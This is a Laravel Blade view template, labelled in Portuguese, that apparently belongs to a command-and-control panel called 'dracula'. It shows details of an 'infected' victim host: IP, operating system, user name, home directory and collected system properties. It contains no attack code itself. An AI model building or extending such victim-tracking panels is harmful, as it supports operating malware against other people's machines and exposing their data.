@extends('layouts.app')
@section('content')
 <div class="container">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">View Hosts Infectados</div>

                <div class="card-body">
                    @if (session('status'))
                        <div class="alert alert-success" role="alert">
                            {{ session('status') }}
                        </div>
                    @endif

                    <section class="victim-text">
                        <h2><b>Host Victim</b></h2>
                        <p>Detalhes do host</p>  
                    </section>

                    <img src="https://i.postimg.cc/14x6bQmx/Cool-Clips-vc014683.png" class="victim-img">
                    
                    <a href="{{route('home')}}" class="btn btn-success ml-1" style="float:right;padding-top:100px;">Index</a>

                    <a href="{{route('dracula.hosts.index')}}" class="btn btn-primary" style="float:right;padding-top:100px;">Hosts</a>
                    
                    <br>
                    <br>

                    <section class="victim-text">
                        <hr><h2>R E S U M E</h2><br>
                   
                        <table class="table table-bordered">
                        <thead>
                            <tr>
                                <th scope="col">#</th>
                                <th scope="col">IP</th>
                                <th scope="col">OS</th>
                                <th scope="col">OS Version</th>
                                <th scope="col">OS User</th>
                                <th scope="col">OS Home</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td>{{$host->host_id}}</td>
                                <td>{{$host->ip}}</td>
                                <td>{{$host->os}}</td>
                                <td>{{$host->osversion}}</td>
                                <td>{{$host->osuser}}</td>
                                <td>{{$host->oshome}}</td>
                            </tr>
                        </tbody>
                        </table>
                    </section>

                    <section class="victim-text">
                        <br><hr><h2>I N F O</h2><br>
                    </section>   
                                                
                    @foreach($arr=explode(',', $host->osproperties) as $info)
                        {{ $info  }}<br>
                    @endforeach                    
                    

                </div>
            </div>
        </div>
    </div>
</div>

@endsection
